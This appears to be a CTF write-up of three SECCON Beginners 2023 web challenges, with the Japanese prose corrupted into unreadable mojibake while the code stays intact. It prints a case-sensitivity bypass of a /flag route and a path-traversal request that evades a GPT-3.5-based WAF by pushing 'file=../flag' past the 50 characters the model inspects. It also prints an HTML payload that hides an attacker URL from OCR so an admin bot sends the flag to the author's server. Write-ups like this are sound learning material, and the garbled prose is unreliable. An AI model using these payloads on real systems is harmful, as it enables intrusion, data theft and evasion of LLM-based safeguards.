---
title: 'SECCON Beginners 2023 Writeup webï¼ˆForbidden, aiwaf, phisher2ï¼‰'
tags:
  - Security
  - CTF
  - seccon
  - ctf4b
private: false
updated_at: '2023-06-08T01:28:20+09:00'
id: 87971a8b0136ad4dd3ee
organization_url_name: qiita-inc
---
## ã¯ã˜ã‚ã«

SECCON Beginners 2023ã«å‚åŠ ã—ã¾ã—ãŸï¼

https://www.seccon.jp/2023/beginners/about-seccon-beginners.html

è§£ã‘ãŸå•é¡Œã®ã†ã¡ã€`web`ã®å•é¡Œã«ã¤ã„ã¦ã©ã®ã‚ˆã†ã«è§£ã„ãŸã‹ã‚’æ›¸ãã¾ã™ã€‚

## [web] Forbidden

ä»¥ä¸‹ã®ã‚ˆã†ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒç«‹ã£ã¦ã„ã¦ã€ãã“ã‹ã‚‰flagã‚’å–ã‚‹å•é¡Œã§ã—ãŸã€‚
ä¸€è¦‹ã€`/flag`ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’ã™ã‚‹ã¨ã‚²ãƒƒãƒˆã§ããã†ã§ã™ãŒã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ã‚¹ã«`/flag`ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã¨403ãŒè¿”ã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚

```js:app.js
var express = require("express");
var app = express();

const HOST = process.env.CTF4B_HOST;
const PORT = process.env.CTF4B_PORT;
const FLAG = process.env.CTF4B_FLAG;

app.get("/", (req, res, next) => {
    return res.send('FLAG ã¯ã“ã¡ã‚‰: <a href="/flag">/flag</a>');
});

const block = (req, res, next) => {
    if (req.path.includes('/flag')) {
        return res.send(403, 'Forbidden :(');
    }

    next();
}

app.get("/flag", block, (req, res, next) => {
    return res.send(FLAG);
})

var server = app.listen(PORT, HOST, () => {
    console.log("Listening:" + server.address().port);
});
```

Expressã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€

> Enable case sensitivity.
> Disabled by default, treating â€œ/Fooâ€ and â€œ/fooâ€ as the same.

https://expressjs.com/ja/api.html#express.router

ã¨ã®ã“ã¨ãªã®ã§ã€`/Flag`ãªã©ã§ã‚¢ã‚¯ã‚»ã‚¹ã‚’ã™ã‚‹ã“ã¨ã§å›é¿ã§ãã¾ã™ã€‚

```
$ curl https://forbidden.beginners.seccon.games/Flag
ctf4b{403_forbidden_403_forbidden_403}
```

## [web] aiwaf

ä»¥ä¸‹ã®ã‚ˆã†ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã€`file`ã‚¯ã‚¨ãƒªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§ç¤ºã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¨ã—ã¦è¿”ã™ã‚‚ã®ã§ã—ãŸã€‚
`?file=../flag`ã®ã‚ˆã†ã«ã—ã¦ã‚ã’ã‚‹ã¨ã‚ˆã„ã®ã§ã™ãŒã€AI WAFãŒã„ã‚‹ãŸã‚ãã®ã¾ã¾ã§ã¯flagã‚’å–å¾—ã§ãã¾ã›ã‚“ã€‚

```
$ exa -T -L 2 .
.
â”œâ”€â”€ app.py
â”œâ”€â”€ books
â”‚  â”œâ”€â”€ book0.txt
â”‚  â”œâ”€â”€ book1.txt
â”‚  â”œâ”€â”€ book2.txt
â”‚  â”œâ”€â”€ book3.txt
â”‚  â””â”€â”€ book4.txt
â”œâ”€â”€ Dockerfile
â”œâ”€â”€ flag
â”œâ”€â”€ requirements.txt
â””â”€â”€ uwsgi.ini
```

```app.py
import uuid
import openai
import urllib.parse
from flask import Flask, request, abort

# from flask_limiter import Limiter
# from flask_limiter.util import get_remote_address

##################################################
# OpenAI API key
KEY = "****REDACTED****"
##################################################

app = Flask(__name__)
app.config["RATELIMIT_HEADERS_ENABLED"] = True

# limiter = Limiter(get_remote_address, app=app, default_limits=["3 per minute"])

openai.api_key = KEY

top_page = """
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8" />
    <title>äºç©ºæ–‡åº«</title>
</head>

<body>
    <h1>äºç©ºæ–‡åº«</h1>
    AIã«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ç‰©èªã‚’æ›¸ã„ã¦ã‚‚ã‚‰ã„ã¾ã—ãŸã€‚<br>
    å†…å®¹ã¯æ­£ã—ã„ã‹ã©ã†ã‹ã‚ã‹ã‚Šã¾ã›ã‚“ã€‚<br>
<ul>
    <li><a href="/?file=book0.txt">ã‚æ›¸</a></li>
    <li><a href="/?file=book1.txt">ã„æ›¸</a></li>
    <li><a href="/?file=book2.txt">ã†æ›¸</a></li>
    <!-- <li><a href="/?file=book3.txt">ãˆæ›¸</a></li> -->
</ul>

â€»ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ãŸã‚AI-WAFã‚’å°å…¥ã—ã¦ã„ã¾ã™ã€‚<br>
Â© 2023 ã‚‚ã‚‚ã‚“ãŒã®æ›¸æˆ¿
</body>

</html>
"""


@app.route("/")
def top():
    file = request.args.get("file")
    if not file:
        return top_page
    if file in ["book0.txt", "book1.txt", "book2.txt"]:
        with open(f"./books/{file}", encoding="utf-8") as f:
            return f.read()
    # AI-WAF
    puuid = uuid.uuid4()
    prompt = f"""\
ä»¥ä¸‹ã®{puuid}ã«å›²ã¾ã‚ŒãŸéƒ¨åˆ†ã®URLã‚¯ã‚¨ãƒªã¯ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«æ”»æ’ƒã§ã—ã‚‡ã†ã‹ï¼Ÿ
ãã†ã§ã‚ã‚‹å ´åˆYesã‚’ã€é•ã†å ´åˆNoã‚’è¿”ã—ã¦ãã ã•ã„ã€‚
../ã‚„flagã¨ã„ã†æ–‡å­—åˆ—ãŒå«ã¾ã‚Œã¦ã„ãŸå ´åˆã‚‚Yesã‚’è¿”ã—ã¦ãã ã•ã„ã€‚

{puuid}
{urllib.parse.unquote(request.query_string)[:50]}
{puuid}
"""
    try:
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {
                    "role": "user",
                    "content": prompt,
                },
            ],
        )
        result = response.choices[0]["message"]["content"].strip()
    except:
        return abort(500, "OpenAI APIã®ã‚¨ãƒ©ãƒ¼ã§ã™ã€‚\nå°‘ã—æ™‚é–“ã‚’ãŠã„ã¦ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãã ã•ã„ã€‚")
    if "No" in result:
        with open(f"./books/{file}", encoding="utf-8") as f:
            return f.read().replace(KEY, "")
    return abort(403, "AI-WAFã«æ¤œçŸ¥ã•ã‚Œã¾ã—ãŸğŸ‘»")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=31415)
```


ä¸€è¦‹ã€ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«è¦‹ãˆã¾ã™ãŒã€ã‚ˆãè¦‹ã‚‹ã¨

```py
{urllib.parse.unquote(request.query_string)[:50]}
```

ã¨ãªã£ã¦ãŠã‚Šã€ã‚¯ã‚¨ãƒªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®å…ˆé ­50æ–‡å­—ã—ã‹é€ã£ã¦ã„ãªã„ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

ãã®ãŸã‚ã€

```
?ã“ã‚“ã«ã¡ã¯ã€‚ãŠã’ã‚“ãã§ã™ã‹ã€‚ã“ã‚“ã«ã¡ã¯ã€‚ãŠã’ã‚“ãã§ã™ã‹ã€‚ã“ã‚“ã«ã¡ã¯ã€‚ãŠã’ã‚“ãã§ã™ã‹ã€‚ã“ã‚“ã«ã¡ã¯ã€‚ãŠã’ã‚“ãã§ã™ã‹ã€‚&file=../flag
```

ã®ã‚ˆã†ã«50æ–‡å­—ä»¥é™ã«`file=../flag`ãŒãã‚‹ã‚ˆã†ã«ã—ã¦ã‚ã’ã‚‹ã¨å›é¿ã§ãã¾ã™ã€‚

```
$ curl 'https://aiwaf.beginners.seccon.games/?%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF%E3%80%82%E3%81%8A%E3%81%92%E3%82%93%E3%81%8D%E3%81%A7%E3%81%99%E3%81%8B%E3%
80%82%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF%E3%80%82%E3%81%8A%E3%81%92%E3%82%93%E3%81%8D%E3%81%A7%E3%81%99%E3%81%8B%E3%80%82%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1
%E3%81%AF%E3%80%82%E3%81%8A%E3%81%92%E3%82%93%E3%81%8D%E3%81%A7%E3%81%99%E3%81%8B%E3%80%82%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF%E3%80%82%E3%81%8A%E3%81%92%E3%8
2%93%E3%81%8D%E3%81%A7%E3%81%99%E3%81%8B%E3%80%82&file=../flag'
ctf4b{pr0mp7_1nj3c710n_c4n_br34k_41_w4f}
```

## [web] phisher2

ã“ã®å•é¡Œã¯ã€

`POST /`ã«é€ã‚‰ã‚Œã¦ããŸ`text`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’HTMLãƒ•ã‚¡ã‚¤ãƒ«ã¨ã—ã¦æ›¸ãè¾¼ã¿ã€
ãã®HTMLãƒ•ã‚¡ã‚¤ãƒ«ã‚’Chromeã§è¡¨ç¤ºã•ã›ã¦ã€ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆã‚’å–ã‚Šã¾ã™ã€‚
ãã—ã¦ã€OCRã§ãã®ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆã‹ã‚‰ãƒ†ã‚­ã‚¹ãƒˆã‚’èª­ã¿å–ã‚Šã€
èª­ã¿å–ã£ãŸãƒ†ã‚­ã‚¹ãƒˆãŒ`find_url_in_text`ã§ãƒãƒƒãƒã™ã‚‹ã€ã‹ã¤`https://phisher2.beginners.seccon.games`ã§å§‹ã¾ã£ã¦ã„ã‚‹å ´åˆã€
`text`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§`find_url_in_text`ã«ãƒãƒƒãƒã™ã‚‹URLã«`?flag=FLAG`ã‚¯ã‚¨ãƒªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ã¤ã‘ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ã‚‰ã‚Œã‚‹ã€‚

ã¨ã„ã†ã‚ˆã†ãªã‚‚ã®ã«ãªã£ã¦ã„ã¾ã™ã€‚

```py:app.py
import os
import uuid
from admin import share2admin
from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return open("./index.html").read()

@app.route("/", methods=["POST"])
def chall():
    try:
        text = request.json["text"]
    except Exception:
        return {"message": "text is required."}
    fileId = uuid.uuid4()
    file_path = f"/var/www/uploads/{fileId}.html"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(f'<p style="font-size:30px">{text}</p>')
    message, ocr_url, input_url = share2admin(text, fileId)
    os.remove(file_path)
    return {"message": message, "ocr_url": ocr_url, "input_url": input_url}


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
```

```py:admin.py
import os
import re
import pyocr
import requests
from PIL import Image
from selenium import webdriver

APP_URL = os.getenv("APP_URL", "http://localhost:16161/")
FLAG = os.getenv("FLAG", "ctf4b{dummy_flag}")

# read text from image
def ocr(image_path: str):
    tool = pyocr.get_available_tools()[0]
    return tool.image_to_string(Image.open(image_path), lang="eng")


def openWebPage(fileId: str):
    try:
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--window-size=1920,1080")
        driver = webdriver.Chrome(options=chrome_options)
        driver.implicitly_wait(10)
        url = f"file:///var/www/uploads/{fileId}.html"
        driver.get(url)

        image_path = f"./images/{fileId}.png"
        driver.save_screenshot(image_path)
        driver.quit()
        text = ocr(image_path)
        os.remove(image_path)
        return text
    except Exception:
        return None


def find_url_in_text(text: str):
    result = re.search(r"https?://[\w/:&\?\.=]+", text)
    if result is None:
        return ""
    else:
        return result.group()


def share2admin(input_text: str, fileId: str):
    # admin opens the HTML file in a browser...
    ocr_text = openWebPage(fileId)
    if ocr_text is None:
        return "admin: Sorry, internal server error."

    # If there's a URL in the text, I'd like to open it.
    ocr_url = find_url_in_text(ocr_text)
    input_url = find_url_in_text(input_text)

    # not to open dangerous url
    if not ocr_url.startswith(APP_URL):
        return "admin: It's not url or safe url.", ocr_url, input_text

    try:
        # It seems safe url, therefore let's open the web page.
        requests.get(f"{input_url}?flag={FLAG}")
    except Exception:
        return "admin: I could not open that inner link.", ocr_url, input_text
    return "admin: Very good web site. Thanks for sharing!", ocr_url, input_text
```

ãã®ãŸã‚ã€

- OCRã§`https://phisher2.beginners.seccon.games`ãŒè¿”ã‚‹ã‚ˆã†ã«ã™ã‚‹
- `text`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®`find_url_in_text`ã®ãƒãƒƒãƒã§è‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ãŒè¿”ã‚‹ã‚ˆã†ã«ã™ã‚‹
- è‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ã®ã‚¢ã‚¯ã‚»ã‚¹ãƒ­ã‚°ã‚’è¦‹ã‚‹

ã§flagã‚’ã‚²ãƒƒãƒˆã§ãã¾ã™ã€‚

``OCRã§`https://phisher2.beginners.seccon.games`ãŒè¿”ã‚‹ã‚ˆã†ã«ã™ã‚‹``ã¯ã€`text`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®å†…å®¹ãŒHTMLãƒ•ã‚¡ã‚¤ãƒ«ã¨ã—ã¦ãƒ–ãƒ©ã‚¦ã‚¶ã«èª­ã¿è¾¼ã¾ã‚Œã‚‹ã®ã§ã€

```html
<p style="display: none;">https://example.com</p>
<p>https://phisher2.beginners.seccon.games/</p>
```

ã®ã‚ˆã†ã«ã—ã¦ã‚ã’ã‚‹ã“ã¨ã§å€’ã›ã¾ã™ã€‚
ï¼ˆè‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ã‚’`https://example.com`ã¨ã™ã‚‹å ´åˆï¼‰

`` `text`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®`find_url_in_text`ã®ãƒãƒƒãƒã§è‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ãŒè¿”ã‚‹ã‚ˆã†ã«ã™ã‚‹``ã¯ã€ã¯ã˜ã‚ã«ãƒãƒƒãƒã—ãŸURLãŒè¿”ã‚‹ã“ã¨ãŒã‚ã‹ã‚‹ã®ã§ã€`https://phisher2.beginners.seccon.games/`ã‚’å¾Œã‚ã®ã»ã†ã«æ›¸ã„ã¦ã‚ã’ã‚Œã°ã‚ˆã„ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```py
def find_url_in_text(text: str):
    result = re.search(r"https?://[\w/:&\?\.=]+", text)
    if result is None:
        return ""
    else:
        return result.group()
```

æœ€çµ‚çš„ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ä»¥ä¸‹ã«ãªã‚Šã¾ã™ã€‚

```
$ curl -X POST -H "Content-Type: application/json" -d '{"text":"<p style=\"display: none;\">https://example.com</p><p>https://phisher2.beginners.seccon.games/</p>"}' https://phisher2.beginners.seccon.games
{"input_url":"<p style=\"display: none;\">https://example.com</p><p>https://phisher2.beginners.seccon.games/</p>","message":"admin: Very good web site. Thanks for sharing!","ocr_url":"https://phisher2.beginners.seccon.games/"}
```

è‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ã®ã‚¢ã‚¯ã‚»ã‚¹ãƒ­ã‚°ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€

```
(snip) GET /?flag=ctf4b%7Bw451t4c4t154w?%7D HTTP/1.1" 200 (snip)
```

flagã¤ãã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚
ãƒ‘ãƒ¼ã‚»ãƒ³ãƒˆã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã•ã‚Œã¦ã„ã‚‹ã®ã§ã€æˆ»ã—ã¦ã‚ã’ã‚Œã°flagã‚²ãƒƒãƒˆã§ã™ã€‚

```
irb(main)> require 'uri'; URI.decode_www_form_component('ctf4b%7Bw451t4c4t154w?%7D')
=> "ctf4b{w451t4c4t154w?}"
```

## ã•ã„ã”ã«

webä»¥å¤–ã®å•é¡Œã‚‚è§£ã‘ãŸã‚‚ã®ãŒã„ãã¤ã‹ã‚ã‚‹ã®ã§ã€ã¾ãŸWriteupã‚’æ›¸ã‘ã‚Œã°ãªã¨æ€ã„ã¾ã™ï¼
